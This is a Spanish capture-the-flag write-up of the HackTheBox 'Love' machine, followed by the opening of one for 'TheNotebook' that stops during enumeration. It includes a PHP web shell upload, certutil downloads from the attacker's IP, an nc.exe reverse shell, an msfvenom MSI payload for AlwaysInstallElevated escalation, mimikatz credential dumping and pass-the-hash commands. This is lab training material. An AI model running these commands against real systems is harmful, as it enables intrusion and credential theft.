usaremos esto para agregar un objeto . php que nos permita ejecutar c√≥digo remotamente, mediante √©l lograremos una Reverse Shell como el usuario phoebe en la m√°quina. Hice un script que nos crea el votante, ejecuta comandos en el sistema y hace como si no hubiera pasado nada e. e  arbitrary_up_RCE. py. Estando dentro nos apoyaremos de varias gu√≠as sobre PrivEsc Windows para encontrar un tipo de escalada llamada AlwaysInstallElevated, tendremos que jugar con 2 registros del sistema y validar si est√°n habilitados, en caso de que lo est√©n podremos instalar paquetes MSI con permisos administrativos. Veremos que lo est√°n, as√≠ que generaremos un paquete MSI malicioso con ayuda de msfvenom que una vez se est√© instalando nos genere una Reverse Shell. Con esto lograremos una Shell como el usuario NT AUTHORITY SYSTEM (diosito) en el sistema. Yyyy un autopwn, con √©l conseguimos una Shell en el mismo script como el usuario administrador del sistema.  autopwnLove. py. Basta, a rompernos la cara!! e. e ‚Ä¶ Clasificaci√≥n de la m√°quina: M√°s o menos de todo, intenta jugar con vulns conocidas, pero es bastante juguetona.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Es momento de diversificar los distintos pensamientos‚Ä¶  Reconocimiento.      Escaneo de puertos con nmap.     Enumeraci√≥n.      Enumeraci√≥n servidor web - puerto 80.    Enumeraci√≥n certificado web - puerto 443.     Explotaci√≥n.      Encontrando credenciales del usuario admin contra un login web.    RCE mediante una subida aleatoria de archivos - usuario Phoebe.    Obtenci√≥n de credenciales usuario Phoebe para generar una Shell estable con evil-winrm.     Escalada de privilegios.  Post PrivEsc - Usamos mimikatz para extraer hashes NTLM y hacer passthehash.      Pass-The-Hash - evil-winrm.    Pass-The-Hash - psexec. py.    ‚Ä¶ Reconocimiento #: Enumeraci√≥n de puertos con nmap üîó: Como siempre iniciaremos escaneando los puertos abiertos de la m√°quina, as√≠ empezaremos a encaminar nuestra investigaci√≥n: ‚ù± nmap -p- --open -v 10. 10. 10. 239 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   El escaneo nos devuelve: ‚ù± cat initScan# Nmap 7. 80 scan initiated Mon Jun 21 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 239# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 239 ()	Status: UpHost: 10. 10. 10. 239 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp//unknown///, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 49664/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////# Nmap done at Mon Jun 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 85. 24 seconds      Puerto   Descripci√≥n         80   HTTP: Servidor web       135   RPC: Permite la comunicaci√≥n entre programas       139   SMB: Ayuda a la transferencia de archivos en la red       443   HTTPS: Servicio web ‚Äúseguro‚Äù       445   SMB: Ayuda a la transferencia de archivos en la red       3306   MySQL: Servidor de bases de datos       5000   No lo sabemos a√∫n con certeza       5985   WinRM: Permite realizar tareas administrativas remotamente       5986   WinRM (HTTPS): Permite realizar tareas administrativas remotamente       7680   No lo sabemos a ciencia cierta       5040,49664,49666,49667   Desconocidos       49668,49669,49670   Desconocidos   Bastantes puertos, ahora juntando todos los servicios activos vamos a hacer otro escaneo, pero este para obtener las versiones de cada servicio y si existen scripts relacionados con ellos: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 239  [*] Open ports: 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670[*] Ports copied to clipboard)~ ‚ù± nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670 -sC -sV 10. 10. 10. 239 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   En este caso obtenemos: ‚ù± cat portScan# Nmap 7. 80 scan initiated Mon Jun 21 25:25:25 2021 as: nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680,49664,49666,49667,49668,49669,49670 -sC -sV -oN portScan 10. 10. 10. 239Nmap scan report for 10. 10. 10. 239Host is up (0. 11s latency). PORT   STATE SERVICE   VERSION80/tcp  open http     Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27)| http-cookie-flags: |  /: |   PHPSESSID: |_   httponly flag not set|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27|_http-title: Voting System using PHP135/tcp  open msrpc    Microsoft Windows RPC139/tcp  open netbios-ssn Microsoft Windows netbios-ssn443/tcp  open ssl/http   Apache httpd 2. 4. 46 (OpenSSL/1. 1. 1j PHP/7. 3. 27)|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging. love. htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1. 1445/tcp  open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?| fingerprint-strings: |  DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LPDString, NULL, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: |_  Host '10. 10. 14. 103' is not allowed to connect to this MariaDB server5000/tcp open http     Apache httpd 2. 4. 46 (OpenSSL/1. 1. 1j PHP/7. 3. 27)|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27|_http-title: 403 Forbidden5040/tcp open unknown5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found5986/tcp open ssl/http   Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after: 2024-04-10T14:39:19|_ssl-date: 2021-06-21T16:28:22+00:00; +25m20s from scanner time. | tls-alpn: |_ http/1. 17680/tcp open pando-pub?49664/tcp open msrpc    Microsoft Windows RPC49666/tcp open msrpc    Microsoft Windows RPC49667/tcp open msrpc    Microsoft Windows RPC49668/tcp open msrpc    Microsoft Windows RPC49669/tcp open msrpc    Microsoft Windows RPC49670/tcp open msrpc    Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap. org/cgi-bin/submit. cgi?new-service :SF-Port3306-TCP:V=7. 80%I=7%D=6/21%Time=60D0B785%P=x86_64-pc-linux-gnu%r(NU. . . . . . . . . . . . x20server );Service Info: Hosts: www. example. com, LOVE, www. love. htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h10m20s, deviation: 3h30m02s, median: 25m19s| smb-os-discovery: |  OS: Windows 10 Pro 19042 (Windows 10 Pro 6. 3)|  OS CPE: cpe:/o:microsoft:windows_10::-|  Computer name: Love|  NetBIOS computer name: LOVE\x00|  Workgroup: WORKGROUP\x00|_ System time: 2021-06-21T09:28:08-07:00| smb-security-mode: |  account_used: &lt;blank&gt;|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-06-21T16:28:06|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Jun 21 25:25:25 2021 -- 1 IP address (1 host up) scanned in 182. 94 secondsTenemos algunas cositas relevantes:       Puerto   Servicio   Versi√≥n         80   HTTP   Apache httpd 2. 4. 46 OpenSSL/1. 1. 1j PHP/7. 3. 27       443   HTTPS   Apache httpd 2. 4. 46 OpenSSL/1. 1. 1j PHP/7. 3. 27    Adem√°s de un dominio: staging. love. htb.  Y un nombre de organizaci√≥n: ValentineCorp.       Puerto   Servicio   Versi√≥n         445   SMB   Windows 10 Pro 19042       5000   HTTP   Servidor web con Apache httpd 2. 4. 46 (OpenSSL/1. 1. 1j PHP/7. 3. 27)   Listones, hemos terminado nuestra enumeraci√≥n con nmap, ahora profundicemos en cada servicio y veamos en cu√°l tenemos posibilidad de romper cositas‚Ä¶ ‚Ä¶ Enumeraci√≥n #: Puerto 80 üîó: Un login‚Ä¶ Intentando distintos ID‚Äôs nos responde con esto:  Cannot find voter with the ID As√≠ que podr√≠amos intentar alg√∫n tipo de fuerza bruta para encontrar si alg√∫n ID nos devuelve una respuesta distinta, peeero antes, podemos probar a agregar el dominio que encontramos en el escaneo de nmap al archivo /etc/hosts y ver si nos responde algo al hacer peticiones hacia √©l: ‚ù± cat /etc/hosts. . . 10. 10. 10. 239 staging. love. htb. . .  ¬øQue es el archivo hosts?. Y ahora en la web pondr√≠amos el dominio: Perfecto, tenemos otro servicio que esta respondiendo contra ese dominio, as√≠ que ahora tenemos m√°s para probar‚Ä¶ (Lo del fuzzeo por ID‚Äôs no nos dio ninguna respuesta, as√≠ que F) Se trata de un servidor web en producci√≥n a√∫n que se encarga de analizar archivos en busca de malware y cositas as√≠, dirigi√©ndonos al apartado Demo (arriba a la izquierda) nos lleva a /beta. php: En √©l podemos a√±adir un archivo mediante una URL y la web har√° el respectivo escaneo del objeto en busca de malware‚Ä¶ Despu√©s de jugar con este apartado no logramos nada interesante (ni reverse shells, ni archivos . php con instrucciones simples (echo 'hola';), ni . exe‚Äôs, nada de eso nos funcion√≥), peeero sabemos que esta funcionando y que adem√°s algunos archivos . php los interpreta, ¬øc√≥mo lo sabemos?, sencillito‚Ä¶ Escaneamos el archivo index. php del servidor local, que ser√≠a el correspondiente a http://10. 10. 10. 239/index. php: Y nos responde con su body: Pero poquito poquito podemos hacer con esto‚Ä¶ Jugando con dirsearch y wfuzz para realizar un fuzzeo en la web principal (http://10. 10. 10. 239) encontramos varios recursos m√°s, pero solo algunos interesantes (y a los que tenemos acceso): ‚ù± wfuzz -c --hc=404,403 -w /opt/SecLists/Discovery/Web-Content/common. txt http://10. 10. 10. 239/FUZZ Visitando /admin obtenemos otro login, pero ahora nos pide usuario y contrase√±a‚Ä¶ Probando con los de siempre, nos damos cuenta de que al colocar cualquier cosa en el campo Username, nos responde con:  Cannot find account with the username Pero al colocar el usuario admin nos devuelve:  Incorrect password As√≠ que sabemos que el usuario admin existe en la base de datos (: Visitando el recurso /includes vemos una lista de archivos: Dando clic en navbar. php encontramos un error, y en ese error la ruta absoluta donde esta alojado el servidor web: No podemos hacer nada con esto, peeeeeero puede llegar a ser importante en caso de querer subir archivos o algo as√≠. Guardao‚Äô‚Ä¶ ‚Ä¶ Puerto 443 üîó: Despu√©s de nuestra enumeraci√≥n con el puerto 80, nos pondremos a enumerar el servicio HTTPS, colocando en el navegador https://10. 10. 10. 239 nos responde que no tenemos acceso a ese recurso :( Peeero podemos apoyarnos de openssl para ver informaci√≥n del certificado SSL con el que se cuenta: ‚ù± openssl s_client -connect 10. 10. 10. 239:443Al ejecutarlo podemos destacar el dominio que ya hab√≠amos visto con nmap, pero tambi√©n un email: . . . depth=0 C = in, ST = m, L = norway, O = ValentineCorp, OU = love. htb, CN = staging. love. htb, emailAddress = roy@love. htb. . . Bien, podemos extraer el usuario roy del email‚Ä¶ Probando con √©l ante SMB y ante los dem√°s recursos no logramos alguna otra respuesta a las que ten√≠amos, pero bueno, guard√©moslo por si algo (: ‚Ä¶ Explotaci√≥n #: Encontrando credenciales del usuario admin, login web üîó: Despu√©s de un tiempo de estar perdido y sin esperanzas e. e Estuvimos jugando con los dem√°s puertos activos, nos dimos cuenta de que al realizar peticiones hacia la http://10. 10. 10. 239:5000 volv√≠amos a recibir:  You don‚Äôt have permission to access this resource. Ac√° record√© lo que hab√≠amos hecho con el analizador de archivos (que hab√≠amos escaneado un objeto local), intentando en vez de escanear el index. php, hacerlo contra el index. php pero del servidor web alojado en el puerto 5000 (que ni idea si exista), curiosamente obtenemos una respuesta:  Encontramos que el servicio del puerto 5000 es uno relacionado con passwords yyy vemos una para el usuario admin (que sab√≠amos que exist√≠a), pues prob√©moslas:  Username: admin.  Password: @LoveIsInTheAir!!!!. Listones, son v√°lidas ü§º RCE mediante una subida aleatoria de archivos üîó: Jugando nos damos cuenta de que podemos agregar votantes Damos clic en New y vemos: Podemos a√±adir una imagen de perfil üòè pues en vez de una imagen, intentemos subir un archivo . php con c√≥digo que nos permita ejecutar comandos en el sistema: ‚ù± cat quesedice. php &lt;?php $command=shell_exec($_GET['xmd']); echo $command; ?&gt;Lo que reciba la variable xmd a trav√©s del m√©todo GET, ser√° ejecutado en el sistema (gracias a la funci√≥n shell_exec(), pero podr√≠amos usar system(), exec() y otras m√°s), el resultado de la ejecuci√≥n se guarda en la variable command y mostrado en pantalla con ayuda de echo. Por ejemplo, si somos el usuario web y hacemos xmd=whoami, se ejecutara whoami en el sistema y guardara web en la variable command, lo siguiente ser√° ver ese resultado con el echo $command. Nuestro formulario quedar√≠a as√≠ (en mi caso): Guardamos y: Vemos el icono de la imagen en todo el centro, la arrastramos (como si quisi√©ramos abrirla en otra ventana) y nos redirige a la URL http://10. 10. 10. 239/images/quesedice. php: Al parecer esta interpretando el c√≥digo, solo que shell_exec esta vac√≠o y nos muestra ese error, juguemos con el m√©todo GET para ejecutar el comando whoami: http://10. 10. 10. 239/images/quesedice. php?xmd=whoamiObtenemos: Opa, tenemos ejecuci√≥n remota de comandos (: El usuario que esta ejecutando el servidor web se llama phoebe, por lo tanto vamos a estar ejecutando comandos como ese usuario (: Ya confirmamos RCE, ahora entabl√©monos una Reverse Shell: Podemos descargar el binario nc. exe desde ac√° (netcat 1. 12), una vez los tengamos en nuestro sistema, los movemos o nos movemos donde est√©n los binarios y levantamos un servidor web con ayuda de Python: ‚ù± python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Ahora procedemos a indicarle a la m√°quina que se descargue el binario nc. exe y lo guarde en su sistema: http://10. 10. 10. 239/images/quesedice. php?xmd=certutil. exe -f -split -urlcache http://10. 10. 14. 103:8000/nc. exe c:\\Users\\phoebe\\Videos\\nc. exeGuardamos el binario en la carpeta Videos del usuario phoebe‚Ä¶ La web nos responde: **** Online **** 0000 . . . 96d8 CertUtil: -URLCache command completed successfully. Validamos que se haya descargado y exista en el sistema: http://10. 10. 10. 239/images/quesedice. php?xmd=dir c:\Users\phoebe\Videos\nc. exe Listones, ahora simplemente le indicamos que una vez entable una conexi√≥n con el puerto 4433 de nuestra m√°quina nos lance por ah√≠ una cmd. exe (una terminal de Windows). Pero claro, antes tenemos que ponernos en escucha por el puerto **4433: ‚ù± nc -lvp 4433listening on [any] 4433 . . . Ahora s√≠, procedamos: http://10. 10. 10. 239/images/quesedice. php?xmd=c:\Users\phoebe\Videos\nc. exe 10. 10. 14. 103 4433 -e cmd. exeYyyyyYyaysdfyyayyYYYYyy:  Peeeeeeeeerfecto, tamos con una terminal en el sistema como el usuario phoebe. ‚Ä¶ He creado un script para facilitar la ejecuci√≥n remota de comandos, solo debemos pasarle el comando y no debemos preocuparnos de nada m√°s (:  arbitrary_up_RCE. py. ‚Ä¶ Obtenci√≥n PowerShell estable con evil-winrm üîó: Enumerando el sistema y la ra√≠z del servidor web, encontramos el archivo que hace la conexi√≥n con la base de datos: c:\\xampp\htdocs\omrs\includes&gt;type conn. php&lt;?php    $conn = new mysqli('localhost', 'phoebe', 'HTB#9826^(_', 'votesystem');    if ($conn-&gt;connect_error) {      die( Connection failed:   . $conn-&gt;connect_error);    }?&gt;Tenemos al usuario phoebe y su contrase√±a contra el servicio MySQL‚Ä¶ Pero haciendo reutilizaci√≥n de contrase√±as y jugando con la herramienta evil-winrm logramos obtener una PowerShell como el usuario Phoebe en el sistema: ‚ù± evil-winrm -i 10. 10. 10. 239 -u 'phoebe' -p 'HTB#9826^(_' As√≠ que ya podemos salirnos de la Reverse Shell (: ‚Ä¶ Escalada de privilegios #: Enumerando el sistema por encima buscando formas de escalar no encontramos nada interesante, o bueno, encontramos una carpeta algo ‚Äúllamativa‚Äù en la ra√≠z del sistema: *Evil-WinRM* PS C:\&gt; dir  Directory: C:\Mode         LastWriteTime     Length Name----         -------------     ------ ----d-----     4/21/2021  9:52 AM        Administration. . . Dentro hay unos objetos, pero nada que sacar de ellos, as√≠ que tamos igual‚Ä¶ De ah√≠ me fui para la web y busqu√© algunas gu√≠as sobre PrivEsc Windows, llegamos a esta de HackTricks, all√≠ encontramos una manera de escalar llamada AlwaysInstallElevated, en la cual debemos validar si dos registros del sistema est√°n habilitados (que tengan el valor 0x1), en caso de que lo est√©n tendremos la posibilidad de instalar Microsoft Windows Installer Package Files (MSI) (paquetes MSI) con permisos administrativos as√≠ no los tengamos (: pues validemos los dos registros: *Evil-WinRM* PS C:\&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedHKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer  AlwaysInstallElevated  REG_DWORD  0x1Bien, siguiente: *Evil-WinRM* PS C:\&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedHKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer  AlwaysInstallElevated  REG_DWORD  0x1Perfecto, entonces tenemos la posibilidad de instalar paquetes MSI con permisos administrativos, apoy√©monos de msfvenom para crear un paquete malicioso que cuando intente instalarlo nos genere una Reverse Shell:  cd6629. gitbook. io - windows privesc - AlwaysInstallElevated. Asignamos nuestra IP y el puerto en el que estaremos escuchando‚Ä¶ ‚ù± msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 14. 103 LPORT=4433 -f msi -o ajaterompi. msiEjecutamos y obtenemos el paquete: [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 324 bytesFinal size of msi file: 159744 bytesSaved as: ajaterompi. msiAhora, subimos el paquete a la m√°quina v√≠ctima y procedemos a instalarlo: *Evil-WinRM* PS C:\Users\Phoebe\Videos&gt; certutil. exe -f -urlcache -split http://10. 10. 14. 103:8000/ajaterompi. msi c:\Users\Phoebe\Videos\ajaterompi. msi Nos ponemos en escucha por el puerto 4433: nc -lvp 4433 Ahora ejecutamos: *Evil-WinRM* PS C:\Users\Phoebe\Videos&gt; msiexec /quiet /qn /i c:\Users\Phoebe\Videos\ajaterompi. msiDonde (gracias a vulp3cula. gitbook. io - privesc windows - AlwaysInstallElevated setting):  /quiet permite bypassear el control de cuentas de usuario (UAC).  /qn le indica al programa que no nos ejecute una interfaz gr√°fica.  /i es el que le dice que queremos hacer una instalaci√≥n de un paquete. Listo, entendiendo que estamos haciendo, procedemos a ejecutar la l√≠nea‚Ä¶ Pero no pasa nada ): Ac√° se me ocurri√≥ que el problema podr√≠a ser PowerShell, as√≠ que volviendo a usar √©l script para ejecutar comandos en el sistema, le decimos que nos ejecute esa l√≠nea: ‚ù± python3 arbitrary_up_RCE. py -c 'msiexec /quiet /qn /i c:\Users\Phoebe\Videos\ajaterompi. msi'Y en nuestro listener: Obtenemos la Reverse Shell como el usuario administrador del sistema (: Recopilamos lo usado:  HackTricks - AlwaysInstallElevated.  cd6629. gitbook. io - windows privesc - AlwaysInstallElevated.  vulp3cula. gitbook. io - privesc windows - AlwaysInstallElevated setting. Veamos las flags‚Ä¶ Y listones, hemos terminado la m√°quina, linda, lindo camino. ‚Ä¶ He creado un script autopwn:  AutopwnLove. py. El cual efect√∫a la explotaci√≥n e instalaci√≥n del paquete . msi para generarnos una Shell en el propio script, el script levantara un servidor web por 10 segundos el cual usaremos para subir el paquete a la m√°quina (que si no le especificas uno el programa lo crea): Post Explotaci√≥n: Extracci√≥n hashes NTLM #: Algo que podemos hacer es jugar con mimikatz (herramienta que entre muchas cosas nos ayuda a robar datos de identificaci√≥n de usuarios) para extraer los hashes NTLM para hacer el famoso ataque PassTheHash:  Este ataque consiste en capturar las passwords que se encuentran almacenadas en la memoria RAM. En realidad, no se capturan las passwords como tal, sino que se captura el hash de cada password. Qu√© es Mimikatz?.  Si una persona captura el hash de la password, puede hacer exactamente lo mismo que si tuviera la password original. Perfectisimo, pues subamos mimikatz a la m√°quina v√≠ctima, lo podemos descargar del propio repositorio en la parte Releases‚Ä¶ Una vez tengamos el binario mimikatz. exe, lo subimos y ejecutamos: c:\Users\Administrator\Videos&gt;mimikatz. exe . #####.  mimikatz 2. 2. 0 (x64) #19041 May 31 2021 00:08:47 . ## ^ ##.   A La Vie, A L'Amour  - (oe. eo) ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi. com ) ## \ / ##    &gt; https://blog. gentilkiwi. com/mimikatz '## v ##'    Vincent LE TOUX       ( vincent. letoux@gmail. com ) '#####'    &gt; https://pingcastle. com / https://mysmartlogon. com ***/mimikatz # Ahora, si queremos intentar ver las contrase√±as en texto plano (o al menos los hashes NTLM) escribimos: mimikatz # sekurlsa::logonpasswordsNos responder√≠a con info de los usuarios, en este caso de Phoebe y Administrator: Phoebe: Administrator: Vemos los hashes NTLM pero no las contrase√±as en texto plano, aunque nos da igual, ya que podemos hacer mucho con simplemente los hashes, como por ejemplo entablarnos una PowerShell con ayuda de evil-winrm o psexec. py como cualquiera de los dos usuarios: Pass-The-Hash - evil-winrm üîó: Por ejemplo para el usuario Phoebe tomar√≠amos su hash y escribir√≠amos: ‚ù± evil-winrm -i 10. 10. 10. 239 -u 'phoebe' -H a9ccd3a011ceb45b44ce6f6b40122268 Y har√≠amos lo mismo con el usuario Administrator (con el que realmente no nos sabemos su contrase√±a): üòú ü•¥ üòµ Pass-The-Hash - psexec. py üîó: Es igual de sencillo, solo que esta vez nos lo permiti√≥ solo con el usuario Administrator: Phoebe: ‚ù± psexec. py -hashes :a9ccd3a011ceb45b44ce6f6b40122268 Phoebe@10. 10. 10. 239Impacket v0. 9. 22. dev1+20200909. 150738. 15f3df26 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on 10. 10. 10. 239. . . . . [-] share 'ADMIN$' is not writable. [-] share 'C$' is not writable. Administrator: ‚Ä¶ Y as√≠ conseguir√≠amos una Shell sin necesidad de contrase√±as e incluso sin necesidad de explotaci√≥n alguna, simplemente con el hash NTLM identificador del usuario (: Podemos hacer m√°s cositas guapas con mimikatz, pero eso ya se los dejo de investigaci√≥n :P ‚Ä¶ No me llamo tanto la atenci√≥n el encontrar la contrase√±a de Phoebe en una p√°gina web as√≠ de la nada, pero de resto estuvo lindo el camino. Y una vez m√°s est√°n volviendo a poner m√°quinas que si son sencillitas, esas que incentivan a la gente y no les hace explotar la cabeza tan deprisa jajaj, as√≠ que gracias HTB. La escalada no la hab√≠a hecho y me pareci√≥ interesante, no s√© que tan frecuente se ve eso en realidad, pero bueno, existe‚Ä¶ Bueno, nos leeremos despu√©s, a seguir disfrutando de la vida y a seguir rompiendo todo!! Bless &lt;3 "
    }, {
    "id": 30,
    "url": "http://localhost:4000/htb/thenotebook",
    "title": "HackTheBox - TheNotebook",
    "body": "2021/07/31 - M√°quina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker mediante un CVE que permite sobreescribir el contenido del binario /bin/sh con lo que queramos.  TL;DR (Spanish writeup): Creada por: mostwanted002. Se ave cina‚Ä¶ Hola, nos enfrentaremos a un inicio muy lindo. Encontraremos un sitio web que nos permite guardar nuestras notas y nada m√°s :O Pero ech√°ndole ojo a la cookie veremos algo interesante, es generada mediante JSON Web Tokens con una estructura peculiar, la llave con la que lo hace esta siendo llamada mediante una URL y cada usuario lleva indicado si es o no admin, aprovecharemos esto para crear un nuevo token que llame la llave de nuestro servidor y tambi√©n otorg√°ndole permisos a nuestro usuario de ser admin. Esto para finalmente lograr subir archivos en el Admin Panel yyy claramente subiremos una Web Shell para obtener una sesi√≥n en la m√°quina como www-data. Cree un script para automatizar todo este proceso y obtener RCE en la terminal, √©chenle un ojazo:  RCE_phpfile. py. Enumerando nos toparemos con las llaves SSH del usuario noah, usaremos su llave privada para obtener una sesi√≥n en la m√°quina sin necesitar la contrase√±a. Validando los permisos de administrador que tenemos sobre el sistema, nos daremos cuenta de que podemos ejecutar un contenedor con Docker, validando la versi√≥n del propio Docker y buscando vulnerabilidades relacionadas, encontraremos una que nos permite modificar el contenido del binario runC (que se ejecuta siempre que llamemos a Docker) y que al mismo tiempo modifica el binario /bin/sh con nuestro payload, para una vez llamemos una Shell con /bin/sh dentro del contenedor se ejecute el payload‚Ä¶ Usaremos esto para conseguir una Shell como el usuario root, a darleeeee. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Vulns conocidas, le cuesta mucho llegar a ser real (pero lo intenta).  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Nuestro camino a donde gloria:  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral noah.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Inicialmente haremos un escaneo de puertos para saber que servicios esta ejecutando la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 230 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535.        ‚Äìopen   Solo los puertos que est√°n abiertos.        -v   Permite ver en consola lo que va encontrando.        -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Mon Mar 15 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 230# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 230 ()  Status: UpHost: 10. 10. 10. 230 ()  Ports: 22/open/tcp//ssh///, 80/open/tcp//http///# Nmap done at Mon Mar 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 112. 60 secondsA ver, que tenemos‚Ä¶       Puerto   Descripci√≥n         22   SSH: Acceso a un servidor remoto por medio de un canal seguro.        80   HTTP: Servidor web.    Ahora hagamos un escaneo de scripts y versiones con base en cada servicio (puerto) encontrado, as√≠ validamos a profundidad cada uno: ‚ù≠ nmap -p 22,80 -sC -sV 10. 10. 10. 230 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Mon Mar 15 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10. 10. 10. 230Nmap scan report for 10. 10. 10. 230Host is up (0. 12s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)|  256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)|_ 256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)80/tcp open http  nginx 1. 14. 0 (Ubuntu)|_http-server-header: nginx/1. 14. 0 (Ubuntu)|_http-title: The Notebook - Your Note KeeperService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Mar 15 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11. 66 secondsObtenemos:       Puerto   Servicio   Versi√≥n         22   SSH   OpenSSH 7. 6p1 Ubuntu 4ubuntu0. 3       80   HTTP   nginx 1. 14. 0   A darle a ver por donde podemos entrar. ‚Ä¶ Puerto 80 √ó: Un lugar para guardar mis notas o pensamientos‚Ä¶ Podemos registrarnos e ingresar al sitio, despu√©s de este paso, en el dashboard tenemos: Hagamos caso y veamos las notas: (disculpar√°n el mont√≥n de pruebas) Algo raro que note fue la URL, no s√©, poco usual‚Ä¶ üåã ¬°Entramos en un Rabbit hole, cuidaoooo!: Despu√©s de un rato enumerando, probando, jugando con la URL, etc. Nada. Haciendo fuzz encontramos un directorio llamado /admin: ‚ù≠ dirsearch. py -u http://10. 10. 10. 230 -q403 -  9B - http://10. 10. 10. 